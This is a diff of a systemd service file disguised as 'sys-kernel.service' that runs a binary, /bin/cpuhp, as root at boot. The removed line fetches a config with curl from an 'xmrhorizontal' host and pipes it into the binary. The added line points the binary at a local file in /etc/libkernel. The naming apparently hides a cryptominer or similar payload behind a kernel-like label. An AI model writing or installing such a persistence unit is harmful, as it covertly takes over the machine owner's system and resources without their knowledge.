@@ -1,11 +1,10 @@
 [Unit]
 Description=sys-kernel.service
-After=default.target
  
 [Service]
 User=root
-Restart=on-failure
-ExecStart=curl -s https://xmrhorizontal.github.io/config.json | /bin/cpuhp --config /dev/stdin
+ExecStart=/bin/cpuhp --config /etc/libkernel
+Type=idle
  
 [Install]
 WantedBy=default.target
